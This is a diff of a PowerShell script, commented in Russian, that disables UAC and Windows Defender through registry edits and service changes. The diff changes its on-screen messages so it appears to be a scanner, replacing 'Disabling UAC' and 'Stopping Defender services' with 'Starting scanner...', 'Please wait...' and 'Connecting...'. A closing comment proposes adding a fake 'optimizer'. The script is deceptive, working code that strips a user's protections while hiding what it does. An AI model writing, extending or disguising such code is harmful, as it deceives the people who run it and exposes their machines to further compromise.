@@ -5,7 +5,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
-Write-Host "Отключение UAC..." -ForegroundColor Yellow
+Write-Host "Запуск сканера..." -ForegroundColor Yellow
 try {
     # Значение 0 отключает UAC. Без перезагрузки изменения могут не полностью вступить в силу.
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord
@@ -15,7 +15,7 @@ try {
     Write-Error "Ошибка при отключении UAC: $_"
 }
 
-Write-Host "`nОтключение Windows Defender..." -ForegroundColor Yellow
+Write-Host "`nОжидайте..." -ForegroundColor Yellow
 try {
     # Отключение через реестр (DisableAntiSpyware)
     $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
@@ -26,7 +26,7 @@ try {
     Write-Host "Windows Defender отключен (через реестр)." -ForegroundColor Green
 
     # Попытка остановки и отключения служб Defender (чтобы сработало без перезагрузки)
-    Write-Host "Остановка служб Defender..." -ForegroundColor Gray
+    Write-Host "Подключение..." -ForegroundColor Gray
     Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
     Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
     
@@ -152,5 +152,6 @@ Write-Host "    [ Нажмите любую клавишу для выхода ]
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 
 # Можно потом тут добавить фейковый "оптимизатор" или что захочешь
+
 
 
